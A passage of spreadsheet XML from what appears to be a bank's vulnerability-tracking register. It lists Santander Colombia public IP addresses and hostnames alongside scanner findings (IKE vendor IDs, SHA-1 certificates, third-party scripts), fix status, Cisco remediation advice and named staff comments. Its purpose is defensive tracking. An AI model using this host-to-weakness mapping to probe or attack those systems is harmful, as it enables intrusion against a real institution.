    <s v="Cisco recommends upgrading to the relevant fixed version referenced in Cisco bug ID CSCvb29204."/>
    <m/>
    <m/>
    <s v="En proceso de certificacion._x000a_No fue certificada_x000a_Susana Tovar: La red ya no existen_x000a_Javier Leon: dado que el servicio se canceló y  que son segmentos públicos el proveedor de servicio reasigno el direccionamiento a otro cliente."/>
    <m/>
  </r>
  <r>
    <n v="58"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet principal Santander (Cableada)"/>
    <m/>
    <m/>
    <x v="31"/>
    <s v="CWE-0: Missing Security Patches"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="181.48.106.210"/>
    <m/>
    <n v="500"/>
    <s v="UDP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="Cisco was able to get the following IKE vendor ID(s) : _x000a_CISCO-DELETE-REASON _x000a_FLEXVPN-SUPPORTED"/>
    <s v="Cisco recommends upgrading to the relevant fixed version referenced in Cisco bug ID CSCvb29204."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="59"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet principal Santander (Cableada)"/>
    <m/>
    <m/>
    <x v="31"/>
    <s v="CWE-0: Missing Security Patches"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="181.48.106.209"/>
    <m/>
    <n v="500"/>
    <s v="UDP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="Cisco was able to get the following IKE vendor ID(s) : _x000a_CISCO-DELETE-REASON FLEXVPN-SUPPORTED"/>
    <s v="Cisco recommends upgrading to the relevant fixed version referenced in Cisco bug ID CSCvb29204."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="60"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet Backup Santander (Cableada"/>
    <m/>
    <m/>
    <x v="31"/>
    <s v="CWE-0: Missing Security Patches"/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <n v="190216136242"/>
    <m/>
    <n v="500"/>
    <s v="UDP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Cisco was able to get the following IKE vendor ID(s) : _x000a_CISCO-DELETE-REASON FLEXVPN-SUPPORTED"/>
    <s v="Cisco recommends upgrading to the relevant fixed version referenced in Cisco bug ID CSCvb29204."/>
    <m/>
    <m/>
    <s v="En proceso de certificacion._x000a_No fue certificada_x000a_Susana Tovar: La red ya no existen_x000a_Javier Leon: dado que el servicio se canceló y  que son segmentos públicos el proveedor de servicio reasigno el direccionamiento a otro cliente."/>
    <m/>
  </r>
  <r>
    <n v="61"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="fw.santander.com.co/Peer del Firewall"/>
    <m/>
    <m/>
    <x v="32"/>
    <s v="CWE-327: Use of a Broken or Unreliable Cryptographic Algorithm"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="170.169.127.22"/>
    <m/>
    <n v="443"/>
    <s v="TCP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="The following certificates were part of the certificate chain sent by _x000a_the remote host, but contain hashes that are considered to be weak. _x000a_Subject : O=InternetNala..fgvprc _x000a_Signature Algorithm : SHA-1 With RSA Encryption _x000a_Valid From : Sep 12 14:32:37 2013 GMT _x000a_Valid To : Sep 07 14:32:37 2033 GMT _x000a_Subject : O=InternetNala..fgvprc/CN=VPN_Nala VPN _x000a_Certificate Signature Algorithm : SHA-1 With RSA Encryption _x000a_Valid From : Oct 16 03:24:58 2016 GMT _x000a_Valid To : Oct 16 03:24:58 2021 GMT"/>
    <s v="Cisco recommends that only SSL certificates with a strong hashing algorithm, such as SHA256, are used."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="62"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet Backup Santander (Cableada"/>
    <m/>
    <m/>
    <x v="33"/>
    <s v="CWE-327: Use of a Broken or Unreliable Cryptographic Algorithm"/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <n v="190216136242"/>
    <m/>
    <n v="500"/>
    <s v="UDP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="190.216.136.242 Notify message 14 (NO-PROPOSAL-CHOSEN) _x000a_HDR=(CKY-R=c9abf8bedbdd981a)"/>
    <s v="Cisco recommends disabling Aggressive Mode and discontinuing the use of PSK for authentication, where possible. If, however, the use of PSK cannot be avoided, then only very strong keys should be used. In addition, where possible, VPN connections should not be permitted from arbitrary IP addresses, although Cisco recognises that this may be impractical for roaming users."/>
    <m/>
    <m/>
    <s v="En proceso de certificacion._x000a_No fue certificada_x000a_Susana Tovar: La red ya no existen_x000a_Javier Leon: dado que el servicio se canceló y  que son segmentos públicos el proveedor de servicio reasigno el direccionamiento a otro cliente."/>
    <m/>
  </r>
  <r>
    <n v="63"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet Backup Santander (Cableada"/>
    <m/>
    <m/>
    <x v="33"/>
    <s v="CWE-327: Use of a Broken or Unreliable Cryptographic Algorithm"/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <n v="190216136241"/>
    <m/>
    <n v="500"/>
    <s v="UDP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="190.216.136.241 Notify message 14 (NO-PROPOSAL-CHOSEN) _x000a_HDR=(CKY-R=9edf4bb7af18e785)"/>
    <s v="Cisco recommends disabling Aggressive Mode and discontinuing the use of PSK for authentication, where possible. If, however, the use of PSK cannot be avoided, then only very strong keys should be used. In addition, where possible, VPN connections should not be permitted from arbitrary IP addresses, although Cisco recognises that this may be impractical for roaming users."/>
    <m/>
    <m/>
    <s v="En proceso de certificacion._x000a_No fue certificada_x000a_Susana Tovar: La red ya no existen_x000a_Javier Leon: dado que el servicio se canceló y  que son segmentos públicos el proveedor de servicio reasigno el direccionamiento a otro cliente."/>
    <m/>
  </r>
  <r>
    <n v="64"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet principal Santander (Cableada)"/>
    <m/>
    <m/>
    <x v="33"/>
    <s v="CWE-327: Use of a Broken or Unreliable Cryptographic Algorithm"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="181.48.106.209"/>
    <m/>
    <n v="500"/>
    <s v="UDP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="181.48.106.209 Notify message 14 (NO-PROPOSAL-CHOSEN) _x000a_HDR=(CKY-R=da7f53d3bac5babb)"/>
    <s v="Cisco recommends disabling Aggressive Mode and discontinuing the use of PSK for authentication, where possible. If, however, the use of PSK cannot be avoided, then only very strong keys should be used. In addition, where possible, VPN connections should not be permitted from arbitrary IP addresses, although Cisco recognises that this may be impractical for roaming users."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="65"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet principal Santander (Cableada)"/>
    <m/>
    <m/>
    <x v="33"/>
    <s v="CWE-327: Use of a Broken or Unreliable Cryptographic Algorithm"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="181.48.106.210"/>
    <m/>
    <n v="500"/>
    <s v="UDP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="181.48.106.210 Notify message 14 (NO-PROPOSAL-CHOSEN) _x000a_HDR=(CKY-R=8361bdd290f487fd)"/>
    <s v="Cisco recommends disabling Aggressive Mode and discontinuing the use of PSK for authentication, where possible. If, however, the use of PSK cannot be avoided, then only very strong keys should be used. In addition, where possible, VPN connections should not be permitted from arbitrary IP addresses, although Cisco recognises that this may be impractical for roaming users."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="66"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet invitados principal Santander (Wifi Ppal)"/>
    <m/>
    <m/>
    <x v="34"/>
    <s v="CWE-200: Information Exposure"/>
    <s v="Solved"/>
    <x v="2"/>
    <m/>
    <m/>
    <s v="181.49.176.3"/>
    <m/>
    <n v="500"/>
    <s v="UDP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-04-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <m/>
    <s v="Cisco recommends that this service is disabled if it is not required, or alternatively that incoming traffic to the affected port is filtered."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="67"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet Backup Santander (Cableada"/>
    <m/>
    <m/>
    <x v="34"/>
    <s v="CWE-200: Information Exposure"/>
    <s v="Dismissed"/>
    <x v="2"/>
    <m/>
    <m/>
    <n v="190216136242"/>
    <m/>
    <n v="500"/>
    <s v="UDP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-04-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Cisco was able to get the following IKE vendor ID(s) : _x000a_CISCO-DELETE-REASON _x000a_FLEXVPN-SUPPORTED"/>
    <s v="Cisco recommends that this service is disabled if it is not required, or alternatively that incoming traffic to the affected port is filtered."/>
    <m/>
    <m/>
    <s v="En proceso de certificacion._x000a_No fue certificada_x000a_Susana Tovar: La red ya no existen_x000a_Javier Leon: dado que el servicio se canceló y  que son segmentos públicos el proveedor de servicio reasigno el direccionamiento a otro cliente."/>
    <m/>
  </r>
  <r>
    <n v="68"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet invitados principal Santander (Wifi Ppal)"/>
    <m/>
    <m/>
    <x v="34"/>
    <s v="CWE-200: Information Exposure"/>
    <s v="Solved"/>
    <x v="2"/>
    <m/>
    <m/>
    <s v="181.49.176.5"/>
    <m/>
    <n v="500"/>
    <s v="UDP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-04-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <m/>
    <s v="Cisco recommends that this service is disabled if it is not required, or alternatively that incoming traffic to the affected port is filtered."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="69"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet Backup Santander (Cableada"/>
    <m/>
    <m/>
    <x v="34"/>
    <s v="CWE-200: Information Exposure"/>
    <s v="Dismissed"/>
    <x v="2"/>
    <m/>
    <m/>
    <n v="190216136241"/>
    <m/>
    <n v="500"/>
    <s v="UDP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-04-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Cisco was able to get the following IKE vendor ID(s) : _x000a_CISCO-DELETE-REASON _x000a_FLEXVPN-SUPPORTED"/>
    <s v="Cisco recommends that this service is disabled if it is not required, or alternatively that incoming traffic to the affected port is filtered."/>
    <m/>
    <m/>
    <s v="En proceso de certificacion._x000a_No fue certificada_x000a_Susana Tovar: La red ya no existen_x000a_Javier Leon: dado que el servicio se canceló y  que son segmentos públicos el proveedor de servicio reasigno el direccionamiento a otro cliente."/>
    <m/>
  </r>
  <r>
    <n v="70"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet principal Santander (Cableada)"/>
    <m/>
    <m/>
    <x v="34"/>
    <s v="CWE-200: Information Exposure"/>
    <s v="Solved"/>
    <x v="2"/>
    <m/>
    <m/>
    <s v="181.48.106.209"/>
    <m/>
    <n v="500"/>
    <s v="UDP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-04-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="Cisco was able to get the following IKE vendor ID(s) : _x000a_CISCO-DELETE-REASON _x000a_FLEXVPN-SUPPORTED"/>
    <s v="Cisco recommends that this service is disabled if it is not required, or alternatively that incoming traffic to the affected port is filtered."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="71"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet invitados principal Santander (Wifi Ppal)"/>
    <m/>
    <m/>
    <x v="34"/>
    <s v="CWE-200: Information Exposure"/>
    <s v="Solved"/>
    <x v="2"/>
    <m/>
    <m/>
    <s v="181.49.176.4"/>
    <m/>
    <n v="500"/>
    <s v="UDP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-04-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <m/>
    <s v="Cisco recommends that this service is disabled if it is not required, or alternatively that incoming traffic to the affected port is filtered."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="72"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="fw.santander.com.co/Peer del Firewall"/>
    <m/>
    <m/>
    <x v="34"/>
    <s v="CWE-200: Information Exposure"/>
    <s v="Dismissed"/>
    <x v="2"/>
    <m/>
    <m/>
    <s v="170.169.127.22"/>
    <m/>
    <n v="500"/>
    <s v="UDP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-04-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Cisco was able to get the following IKE vendor ID(s): _x000a_IKE Fragmentation _x000a_Firewall-1 Unknown Vsn"/>
    <s v="Cisco recommends that this service is disabled if it is not required, or alternatively that incoming traffic to the affected port is filtered."/>
    <m/>
    <m/>
    <s v="En proceso de Certificacion._x000a_Se envió la evidencia para aceptar la vulnerabilidad, dado a que por el puerto 500 esta establacida la VPN"/>
    <m/>
  </r>
  <r>
    <n v="73"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet principal Santander (Cableada)"/>
    <m/>
    <m/>
    <x v="34"/>
    <s v="CWE-200: Information Exposure"/>
    <s v="Solved"/>
    <x v="2"/>
    <m/>
    <m/>
    <s v="181.48.106.210"/>
    <m/>
    <n v="500"/>
    <s v="UDP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-04-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="Cisco was able to get the following IKE vendor ID(s) : _x000a_CISCO-DELETE-REASON _x000a_FLEXVPN-SUPPORTED"/>
    <s v="Cisco recommends that this service is disabled if it is not required, or alternatively that incoming traffic to the affected port is filtered."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="74"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet invitados Backup Santander (Wifi Backup)"/>
    <m/>
    <m/>
    <x v="35"/>
    <s v="CWE-200: Information Exposure"/>
    <s v="Solved"/>
    <x v="2"/>
    <m/>
    <m/>
    <s v="181.48.20.104"/>
    <m/>
    <m/>
    <m/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-04-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="This host returns non-standard timestamps (high bit is set)"/>
    <s v="Cisco recommends that, wherever possible, systems should be configured not to respond to any ICMP requests. In addition, each firewall should be configured to drop all ICMP traffic. Where a case can be made for ICMP traffic to be allowed, it should be restricted by type and only to known, trusted hosts."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="75"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet Backup Santander (Cableada"/>
    <m/>
    <m/>
    <x v="35"/>
    <s v="CWE-200: Information Exposure"/>
    <s v="Dismissed"/>
    <x v="2"/>
    <m/>
    <m/>
    <n v="190216136241"/>
    <m/>
    <m/>
    <m/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-04-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="The difference between the local and remote clocks is 3041 seconds."/>
    <s v="Cisco recommends that, wherever possible, systems should be configured not to respond to any ICMP requests. In addition, each firewall should be configured to drop all ICMP traffic. Where a case can be made for ICMP traffic to be allowed, it should be restricted by type and only to known, trusted hosts."/>
    <m/>
    <m/>
    <s v="En proceso de certificacion._x000a_No fue certificada_x000a_Susana Tovar: La red ya no existen_x000a_Javier Leon: dado que el servicio se canceló y  que son segmentos públicos el proveedor de servicio reasigno el direccionamiento a otro cliente."/>
    <m/>
  </r>
  <r>
    <n v="76"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet Backup Santander (Cableada"/>
    <m/>
    <m/>
    <x v="35"/>
    <s v="CWE-200: Information Exposure"/>
    <s v="Dismissed"/>
    <x v="2"/>
    <m/>
    <m/>
    <n v="190216136242"/>
    <m/>
    <m/>
    <m/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-04-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="The difference between the local and remote clocks is 3041 seconds."/>
    <s v="Cisco recommends that, wherever possible, systems should be configured not to respond to any ICMP requests. In addition, each firewall should be configured to drop all ICMP traffic. Where a case can be made for ICMP traffic to be allowed, it should be restricted by type and only to known, trusted hosts."/>
    <m/>
    <m/>
    <s v="En proceso de certificacion._x000a_No fue certificada_x000a_Susana Tovar: La red ya no existen_x000a_Javier Leon: dado que el servicio se canceló y  que son segmentos públicos el proveedor de servicio reasigno el direccionamiento a otro cliente."/>
    <m/>
  </r>
  <r>
    <n v="77"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet invitados principal Santander (Wifi Ppal)"/>
    <m/>
    <m/>
    <x v="35"/>
    <s v="CWE-200: Information Exposure"/>
    <s v="Solved"/>
    <x v="2"/>
    <m/>
    <m/>
    <s v="181.49.176.1"/>
    <m/>
    <m/>
    <m/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-04-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="This host returns non-standard timestamps (high bit is set)"/>
    <s v="Cisco recommends that, wherever possible, systems should be configured not to respond to any ICMP requests. In addition, each firewall should be configured to drop all ICMP traffic. Where a case can be made for ICMP traffic to be allowed, it should be restricted by type and only to known, trusted hosts."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="78"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet invitados Backup Santander (Wifi Backup)"/>
    <m/>
    <m/>
    <x v="35"/>
    <s v="CWE-200: Information Exposure"/>
    <s v="Solved"/>
    <x v="2"/>
    <m/>
    <m/>
    <s v="181.48.20.111"/>
    <m/>
    <m/>
    <m/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-04-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="This host returns non-standard timestamps (high bit is set)"/>
    <s v="Cisco recommends that, wherever possible, systems should be configured not to respond to any ICMP requests. In addition, each firewall should be configured to drop all ICMP traffic. Where a case can be made for ICMP traffic to be allowed, it should be restricted by type and only to known, trusted hosts."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="79"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet principal Santander (Cableada)"/>
    <m/>
    <m/>
    <x v="35"/>
    <s v="CWE-200: Information Exposure"/>
    <s v="Solved"/>
    <x v="2"/>
    <m/>
    <m/>
    <s v="181.48.106.209"/>
    <m/>
    <m/>
    <m/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-04-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="The difference between the local and remote clocks is 2862 seconds."/>
    <s v="Cisco recommends that, wherever possible, systems should be configured not to respond to any ICMP requests. In addition, each firewall should be configured to drop all ICMP traffic. Where a case can be made for ICMP traffic to be allowed, it should be restricted by type and only to known, trusted hosts."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="80"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet principal Santander (Cableada)"/>
    <m/>
    <m/>
    <x v="35"/>
    <s v="CWE-200: Information Exposure"/>
    <s v="Solved"/>
    <x v="2"/>
    <m/>
    <m/>
    <s v="181.48.106.210"/>
    <m/>
    <m/>
    <m/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-04-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="The difference between the local and remote clocks is 2863 seconds."/>
    <s v="Cisco recommends that, wherever possible, systems should be configured not to respond to any ICMP requests. In addition, each firewall should be configured to drop all ICMP traffic. Where a case can be made for ICMP traffic to be allowed, it should be restricted by type and only to known, trusted hosts."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="81"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet invitados Backup Santander (Wifi Backup)"/>
    <m/>
    <m/>
    <x v="35"/>
    <s v="CWE-200: Information Exposure"/>
    <s v="Solved"/>
    <x v="2"/>
    <m/>
    <m/>
    <s v="181.48.20.105"/>
    <m/>
    <m/>
    <m/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-04-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="This host returns non-standard timestamps (high bit is set)"/>
    <s v="Cisco recommends that, wherever possible, systems should be configured not to respond to any ICMP requests. In addition, each firewall should be configured to drop all ICMP traffic. Where a case can be made for ICMP traffic to be allowed, it should be restricted by type and only to known, trusted hosts."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="82"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Wep App"/>
    <s v="A2 20190509_2.3.1.c_CO_20200612_N_10"/>
    <m/>
    <s v="Portal Web"/>
    <m/>
    <m/>
    <x v="36"/>
    <s v="CWE-830: Inclusion of Web Functionality from an Untrusted Source"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="170.169.33.93"/>
    <s v="www.santander.com.co"/>
    <n v="443"/>
    <s v="TCP"/>
    <d v="2019-12-17T00:00:00"/>
    <n v="2380"/>
    <d v="2020-03-16T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha: 12/06/2020"/>
    <s v="1ª Fecha: 09/09/2020"/>
    <d v="2021-03-05T00:00:00"/>
    <s v="La respuesta incluye dinámicamente el siguiente guión de otro dominio: _x000a_- https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js _x000a_- https://platform.twitter.com/oct.js _x000a_- https://sb.scorecardresearch.com/c2/16058935/cs.js _x000a_- https://www.youtube.com/iframe_api _x000a_- https://www.youtube.com/player_api _x000a_- https://www.images-home.com/image.js"/>
    <s v="_x000a_Cisco recomienda que no se utilicen dominios cruzados, particularmente de sistemas controlados por terceros. Siempre que sea posible, la aplicación web debe ser autónoma y cualquier copia incluida de los hosts remotos y colocada en el servidor web que aloja la aplicación."/>
    <m/>
    <d v="2020-10-15T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="83"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Wep App"/>
    <s v="BSNC-2020-005"/>
    <m/>
    <s v="Web de Proveedores"/>
    <m/>
    <m/>
    <x v="36"/>
    <s v="CWE-830: Inclusion of Web Functionality from an Untrusted Source"/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="170.169.33.48"/>
    <s v="confirming.santander.com.co"/>
    <n v="443"/>
    <s v="TCP"/>
    <d v="2019-12-17T00:00:00"/>
    <n v="2380"/>
    <d v="2020-03-16T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha:_x000a_2ª Fecha:"/>
    <s v="1ª Fecha:_x000a_2ª Fecha:"/>
    <d v="2020-07-13T00:00:00"/>
    <s v="La respuesta incluye dinámicamente el siguiente guión de otro dominio: _x000a_- https://www.images-home.com/image.js"/>
    <s v="Cisco recomienda que no se utilicen dominios cruzados, particularmente de sistemas controlados por terceros. Siempre que sea posible, la aplicación web debe ser autónoma y cualquier copia incluida de los hosts remotos y colocada en el servidor web que aloja la aplicación."/>
    <s v="El script puede hacer cualquier cosa que los propios scripts de la aplicación puedan hacer, como acceder a los datos de la aplicación y realizar acciones dentro del contexto del usuario actual."/>
    <d v="2020-06-30T00:00:00"/>
    <s v="Fue dado de baja el Lunes 13 de Julio del 2020"/>
    <m/>
  </r>
  <r>
    <n v="84"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="N/A"/>
    <m/>
    <m/>
    <x v="37"/>
    <s v="CWE-830: Inclusion of Web Functionality from an Untrusted Source"/>
    <s v="N/A"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <n v="46196"/>
    <d v="1900-03-30T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <s v="N/A"/>
    <s v="The Team observed that the ‘HTTPOnly’ attribute was not set."/>
    <s v="Cisco recommends that the web application is reconfigured to use ‘HTTPOnly’ cookies._x000a_PHP can be configured to set the ‘HTTPOnly’ attribute on all cookies by setting ‘session.cookie_httponly’ to ‘true’ in ‘php.ini’._x000a_The ‘HTTPOnly’ attribute can be set on a page-by-page basis as follows:_x000a_session_set_cookie_params(null, null, null, null, true); session_start();_x000a_Sun Java EE has supported the ‘HTTPOnly’ flag in the Cookie interface since version 6 (Servlet class version 3), as well as for session cookies (‘JSESSIONID’). Methods ‘setHttpOnly’ and ‘isHttpOnly’ can be used to set and check for ‘HTTPOnly’ value in the cookies._x000a_For older versions the workaround is to rewrite the ‘JSESSIONID’ value using and setting it as a custom header:_x000a_String sessionid = request.getSession().getId();_x000a_response.setHeader(&quot;SET-COOKIE&quot;, &quot;JSESSIONID=&quot; + sessionid + &quot;; HttpOnly&quot;);"/>
    <m/>
    <m/>
    <s v="Esta vulnerabilidad no se encuentra presente en ningun activo que pertenezca a BSNC"/>
    <m/>
  </r>
  <r>
    <n v="85"/>
    <s v="BSNC"/>
